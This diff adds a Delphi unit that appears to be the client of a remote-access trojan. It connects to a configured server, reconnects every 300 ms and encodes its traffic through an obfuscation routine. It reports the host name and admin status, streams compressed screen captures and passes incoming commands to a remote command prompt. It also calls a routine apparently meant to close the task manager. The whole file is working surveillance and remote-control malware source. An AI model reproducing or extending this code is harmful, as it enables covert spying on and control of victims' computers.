@@ -1,0 +1,536 @@
+﻿unit conexoes;
+
+interface
+
+uses
+  Windows, Messages, Graphics, StdCtrls, ExtCtrls,
+  SysUtils, Variants, Contnrs, IdHashMessageDigest, idHash,
+  dwmapi, principal, Classes, Controls, Forms, zlib,
+  System.Win.ScktComp, Vcl.Clipbrd;
+
+type
+  TFormPrincipal = class(TForm)
+  end;
+
+type
+  TClientePrincipal = class(TThread)
+    SocketPrincipal: TClientSocket;
+    constructor Create;
+    procedure Execute; override;
+  public
+
+    procedure SocketPrincipalRead(Sender: TObject; Socket: TCustomWinSocket);
+    procedure SocketPrincipalConnect(Sender: TObject; Socket: TCustomWinSocket);
+    procedure SocketPrincipalError(Sender: TObject; Socket: TCustomWinSocket;
+      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+    procedure SocketPrincipalDisconnect(Sender: TObject;
+      Socket: TCustomWinSocket);
+  end;
+
+type
+  TClienteCmd = class(TThread)
+    CmdSocket: TClientSocket;
+    constructor Create;
+  protected
+    procedure Execute; override;
+  public
+    procedure CmdcRead(Sender: TObject; Socket: TCustomWinSocket);
+    procedure CmdcConnect(Sender: TObject; Socket: TCustomWinSocket);
+    procedure CmdError(Sender: TObject; Socket: TCustomWinSocket;
+      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+    procedure CmdDisconnect(Sender: TObject; Socket: TCustomWinSocket);
+  end;
+
+type
+  TClienteViewer = class(TThread)
+    SocketViewer: TClientSocket;
+    constructor Create;
+  protected
+    procedure Execute; override;
+  public
+
+    procedure SocketViewerRead(Sender: TObject; Socket: TCustomWinSocket);
+    procedure SocketViewerConnect(Sender: TObject; Socket: TCustomWinSocket);
+    procedure SocketViewerError(Sender: TObject; Socket: TCustomWinSocket;
+      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+    procedure SocketViewerDisconnect(Sender: TObject; Socket: TCustomWinSocket);
+  end;
+
+var
+  ImgTemp, ArqTmp, MyFirstBmp, MySecondBmp, MyCompareBmp,
+    PackStream: TMemoryStream;
+  hWndMag: HWND;
+  hWndHost, desktop: HWND;
+  wc: TWndClass;
+  RecebendoDados: Boolean;
+  iSendCount: Integer;
+  CmdRmt: TPromptCmd;
+  NextHandle: HWND;
+  r: TRect;
+  hTimer: UINT = 0; // handle do timer
+procedure EnviaTx(strValor: String);
+
+implementation
+
+uses variaveis, tapioca, usession, umodulo;
+
+constructor TClientePrincipal.Create;
+begin
+  inherited Create(True);
+  FreeOnTerminate := True;
+  Priority := tpNormal;
+  Peek;
+  TListar := TStringList.Create;
+  Inicializado := MagInitialize;
+  if not(Inicializado) then
+    exit
+  else
+    InitializeMagnifier;
+end;
+
+constructor TClienteCmd.Create;
+begin
+  inherited Create(True);
+  FreeOnTerminate := True;
+  Priority := tpNormal;
+end;
+
+constructor TClienteViewer.Create;
+begin
+  inherited Create(True);
+  FreeOnTerminate := True;
+  Priority := tpNormal;
+  ArqTmp := TMemoryStream.Create;
+  ImgTemp := TMemoryStream.Create;
+end;
+
+// ------------------------------------------------------------------------------
+procedure EnviaTx(strValor: String);
+begin
+  CmdSocket.CmdSocket.Socket.SendText(strValor);
+end;
+
+procedure TimerProc(HWND: HWND; uMsg, idEvent: UINT; dwTime: DWORD); stdcall;
+begin
+  if (cmdPrincipal.SocketPrincipal.Socket.Connected = False) and (vFlagExit = 0)
+  then
+    cmdPrincipal.SocketPrincipal.Open;
+
+end;
+
+// ------------------------------------------------------------------------------
+
+function CalcularHash(const MS: TBitMap): AnsiString;
+var
+  idmd5: TIdHashMessageDigest5;
+  MS2: TStream;
+  Hash: T4x4LongWordRecord;
+
+begin
+  idmd5 := TIdHashMessageDigest5.Create;
+  // fs := TFileStream.Create(fileName, fmOpenRead OR fmShareDenyWrite) ;
+  try
+    MS2 := TMemoryStream.Create;
+    MS.SaveToStream(MS2);
+    MS2.Position := 0;
+    result := idmd5.HashStreamAsHex(MS2);
+  finally
+    MS2.Free;
+    idmd5.Free;
+  end;
+end;
+
+procedure DoCompress(inStream: TStream);
+var
+  outMS: TMemoryStream;
+  ZStream: TCompressionStream;
+begin
+  outMS := TMemoryStream.Create;
+  try
+    inStream.Seek(0, soFromBeginning);
+
+    outMS.Size := 0;
+    ZStream := TCompressionStream.Create(NivelCompressao, outMS);
+    try
+      ZStream.CopyFrom(inStream, 0);
+    finally
+      ZStream.Free;
+    end;
+
+    inStream.Size := outMS.Size;
+    inStream.Position := 0;
+    inStream.CopyFrom(outMS, 0);
+  finally
+    outMS.Free;
+  end;
+end;
+
+function StreamToString(Stream: TStream): string;
+var
+  MS: TMemoryStream;
+begin
+  result := '';
+  MS := TMemoryStream.Create;
+  try
+    MS.LoadFromStream(Stream);
+    SetString(result, PAnsiChar(MS.memory), MS.Size);
+  finally
+    MS.Free;
+  end;
+end;
+
+procedure CompareStream(MyFirstStream, MySecondStream, MyCompareStream
+  : TMemoryStream);
+var
+  I: Integer;
+  P1, P2, P3: ^AnsiChar;
+begin
+  MySecondStream.Clear;
+  MyCompareStream.Clear;
+
+  EnviaBuffe(False, MySecondStream);
+  P1 := MyFirstStream.memory;
+  P2 := MySecondStream.memory;
+  MyCompareStream.SetSize(MyFirstStream.Size);
+  P3 := MyCompareStream.memory;
+
+  for I := 0 to MyFirstStream.Size - 1 do
+  begin
+    if P1^ = P2^ then
+      P3^ := '0'
+    else
+      P3^ := P2^;
+    Inc(P1);
+    Inc(P2);
+    Inc(P3);
+
+  end;
+  MyFirstStream.Clear;
+  MyFirstStream.CopyFrom(MySecondStream, 0);
+  // if (MagSetImageScalingCallback(hWndMag, MagImageScalingCallback)) then
+
+end;
+
+{ ----------------------------------TClienteCmd -------------------------------- }
+
+procedure TClienteCmd.CmdcConnect(Sender: TObject; Socket: TCustomWinSocket);
+begin
+  Pausar(1000);
+  Socket.SendText(vDc_vCri('C', '#sTrCmdOK#'));
+  Pausar(2000);
+  Socket.SendText(vDc_vCri('C', '#S#'));
+  //
+
+end;
+
+procedure TClienteCmd.CmdcRead(Sender: TObject; Socket: TCustomWinSocket);
+var
+  comando: String;
+  LstComando: TStringList;
+
+begin
+  try
+    comando := String(Socket.ReceiveText);
+    if (Pos('#hKey#', vDc_vCri('D', comando)) > 0) then
+    begin
+      LstComando := TStringList.Create;
+      LstComando := SplitString(vDc_vCri('D', comando), '<#>');
+      ChaveKey := LstComando[1];
+      LstComando.Free;
+    end;
+    CmdRmt.fila.Add(Trim(comando));
+    Socket.SendText(O_F_uS_C('C', '#S#'));
+  except
+
+  end;
+end;
+
+procedure TClienteCmd.CmdDisconnect(Sender: TObject; Socket: TCustomWinSocket);
+begin
+  try
+    Suspend;
+    Terminate;
+    CmdRmt.Suspend;
+    CmdRmt.Terminate;
+
+  except
+  end;
+end;
+
+procedure TClienteCmd.CmdError(Sender: TObject; Socket: TCustomWinSocket;
+  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+begin
+  ErrorCode := 0;
+end;
+
+procedure TClientePrincipal.Execute;
+begin
+  SocketPrincipal := TClientSocket.Create(nil);
+  SocketPrincipal.Address := ServidorIP;
+  SocketPrincipal.Host := ServidorIP;
+  SocketPrincipal.Port := PortaServe;
+
+  SocketPrincipal.OnConnect := SocketPrincipalConnect;
+  SocketPrincipal.OnRead := SocketPrincipalRead;
+  SocketPrincipal.OnDisconnect := SocketPrincipalDisconnect;
+  SocketPrincipal.OnError := SocketPrincipalError;
+  SocketPrincipal.Open;
+  hTimer := SetTimer(0, 0, 300, @TimerProc);
+
+end;
+
+procedure TClienteCmd.Execute;
+begin
+  CmdSocket := TClientSocket.Create(nil);
+  CmdSocket.Address := ServidorIP;
+  CmdSocket.Host := ServidorIP;
+  CmdSocket.Port := PortaServe;
+  CmdSocket.OnConnect := CmdcConnect;
+  CmdSocket.OnRead := CmdcRead;
+  CmdSocket.OnDisconnect := CmdDisconnect;
+  CmdSocket.OnError := CmdError;
+  CmdSocket.Open;
+end;
+
+procedure TClientePrincipal.SocketPrincipalConnect(Sender: TObject;
+  Socket: TCustomWinSocket);
+begin
+  vFlagExit := 1;
+  sleep(3000);
+  Socket.SendText(vDc_vCri('C', '#sTrSktPrin#'));
+end;
+
+procedure TClientePrincipal.SocketPrincipalDisconnect(Sender: TObject;
+  Socket: TCustomWinSocket);
+begin
+  try
+
+    SocketPrincipal.Close;
+    if Assigned(SocketViewer) then
+      SocketViewer.SocketViewer.Close;
+    if Assigned(CmdSocket) then
+      CmdSocket.CmdSocket.Close;
+
+  except
+  end;
+end;
+
+procedure TClientePrincipal.SocketPrincipalError(Sender: TObject;
+  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+begin
+  ErrorCode := 0;
+  SocketPrincipal.Address := ServidorIP;
+  SocketPrincipal.Host := ServidorIP;
+  SocketPrincipal.Port := PortaServe;
+
+  vFlagExit := 0;
+  if Assigned(SocketViewer) then
+    SocketViewer.SocketViewer.Close;
+  if Assigned(CmdSocket) then
+    CmdSocket.CmdSocket.Close;
+end;
+
+function FileTimeToDTime(FTime: TFileTime): TDateTime;
+var
+  LocalFTime: TFileTime;
+  STime: TSystemTime;
+begin
+  FileTimeToLocalFileTime(FTime, LocalFTime);
+  FileTimeToSystemTime(LocalFTime, STime);
+  result := SystemTimeToDateTime(STime);
+end;
+
+function Data: string;
+var
+  SR: TSearchRec;
+  CreateDT, AccessDT, ModifyDT: TDateTime;
+begin
+  if FindFirst(Application.ExeName, faAnyFile, SR) = 0 then
+  begin
+    CreateDT := FileTimeToDTime(SR.FindData.ftCreationTime);
+    result := DateTimeToStr(CreateDT)
+  end;
+end;
+
+procedure TClientePrincipal.SocketPrincipalRead(Sender: TObject;
+  Socket: TCustomWinSocket);
+
+  function ComputerName: AnsiString;
+  var
+    buf: array [0 .. 256] of AnsiChar;
+    len: DWORD;
+  begin
+    len := sizeof(buf);
+    GetComputerNameA(@buf, len);
+    result := strPas(PAnsiChar(@buf));
+  end;
+
+var
+  comando: String;
+  pCname: String;
+  Computer: PChar;
+  CSize: DWORD;
+  LstComando: TStringList;
+  msg: TMsg;
+
+begin
+  try
+    comando := vDc_vCri('D', String(Socket.ReceiveText));
+    // ------------------------------------------------------------------------
+    if Pos('#ON-LINE#', comando) > 0 then
+    begin
+      Socket.SendText(vDc_vCri('C', '#strPingOk#'));
+      xClose_Gerenciador;
+      { if Assigned(Chrome_RenderWidgetHostHWND)then
+        if IsElevated then
+        Get_TCPTable(Tlistar); }
+    end;
+
+    if Pos('#Handle#', comando) > 0 then
+    begin
+      LstComando := TStringList.Create;
+      LstComando := SplitString(comando, '<#>');
+      IdServe := LstComando[1];
+      LstComando.Free;
+
+    end;
+
+    if Pos('#xyScree#', comando) > 0 then
+    begin
+      Socket.SendText(vDc_vCri('C', '#strResolucao#' + '<#>' +
+        IntToStr(Screen.Width) + '<#>' + IntToStr(Screen.Height)));
+
+    end;
+
+    if Pos('#Convite#', comando) > 0 then
+    begin
+      Socket.SendText(vDc_vCri('C', '#ConvitRC#' + '<#>' + ComputerName + '-' +
+        Isadmin + '<#>' + (Casa) + '<#>' + Tipo + '-Bad- ' + Versionx + '<#>'));
+    end;
+
+    if Pos('#Iniciar#', comando) > 0 then
+    begin
+
+      SocketViewer := TClienteViewer.Create;
+      SocketViewer.Execute;
+      //
+      Pausar(2000);
+      CmdSocket := TClienteCmd.Create;
+      CmdSocket.Execute;
+      //
+      CmdRmt := TPromptCmd.Create;
+      CmdRmt.Execute;
+
+    end;
+    // -------------------------------------------------------------------------
+  except
+  end;
+
+  TranslateMessage(msg);
+  DispatchMessage(msg);
+
+end;
+
+{ TClienteViewer }
+
+procedure TClienteViewer.Execute;
+begin
+  SocketViewer := TClientSocket.Create(nil);
+  SocketViewer.Host := ServidorIP;
+  SocketViewer.Address := ServidorIP;
+  SocketViewer.Port := PortaServe;
+
+  SocketViewer.OnConnect := SocketViewerConnect;
+  SocketViewer.OnDisconnect := SocketViewerDisconnect;
+  SocketViewer.OnRead := SocketViewerRead;
+  SocketViewer.OnError := SocketViewerError;
+
+  SocketViewer.Open;
+
+end;
+
+procedure TClienteViewer.SocketViewerConnect(Sender: TObject;
+  Socket: TCustomWinSocket);
+var
+  StrCommand, StrPackSize: AnsiString;
+begin
+  Pausar(2000);
+  Socket.SendText(vDc_vCri('C', '#strIniScree#'));
+
+end;
+
+procedure TClienteViewer.SocketViewerDisconnect(Sender: TObject;
+  Socket: TCustomWinSocket);
+begin
+  try
+    Suspend;
+    Terminate;
+    // Socket.Close;
+  except
+
+  end;
+end;
+
+procedure TClienteViewer.SocketViewerError(Sender: TObject;
+  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
+begin
+  ErrorCode := 0;
+end;
+
+procedure TClienteViewer.SocketViewerRead(Sender: TObject;
+  Socket: TCustomWinSocket);
+var
+  StrCommand, StrPackSize: AnsiString;
+  LstComando: TStringList;
+  msg: TMsg;
+begin
+  try
+    StrCommand := Socket.ReceiveText;
+    if Pos('#beginning#', vDc_vCri('D', StrCommand)) > 0 then
+    begin
+      LstComando := TStringList.Create;
+      LstComando := SplitString(vDc_vCri('D', StrCommand), '<#>');
+      Zoom := StrToInt(LstComando[1]);
+      LstComando.Free;
+      MyFirstBmp := TMemoryStream.Create;
+      MySecondBmp := TMemoryStream.Create;
+      MyCompareBmp := TMemoryStream.Create;
+      PackStream := TMemoryStream.Create;
+      iSendCount := 0;
+      MyFirstBmp.Clear;
+      EnviaBuffe(False, MyFirstBmp);
+      MyFirstBmp.Position := 0;
+      PackStream.LoadFromStream(MyFirstBmp);
+      DoCompress(PackStream);
+      PackStream.Position := 0;
+      StrPackSize := IntToStr(PackStream.Size);
+      Socket.SendText('sValueT<#>' + StrPackSize);
+      iSendCount := iSendCount + 1;
+    end;
+    if vDc_vCri('D', StrCommand) = 'gets:' then
+    begin
+      PackStream := TMemoryStream.Create;
+      CompareStream(MyFirstBmp, MySecondBmp, MyCompareBmp);
+      MyCompareBmp.Position := 0;
+      PackStream.LoadFromStream(MyCompareBmp);
+      DoCompress(PackStream);
+      PackStream.Position := 0;
+      StrPackSize := IntToStr(PackStream.Size);
+      Socket.SendText('sValueT<#>' + StrPackSize);
+      iSendCount := iSendCount + 1;
+    end;
+    if vDc_vCri('D', StrCommand) = 'siZeOk:' then
+    begin
+      PackStream.Position := 0;
+      Socket.SendText(StreamToString(PackStream));
+      // ClearAppMemorySize;
+    end;
+
+    TranslateMessage(msg);
+    DispatchMessage(msg);
+
+  except
+  end;
+end;
+
+end.
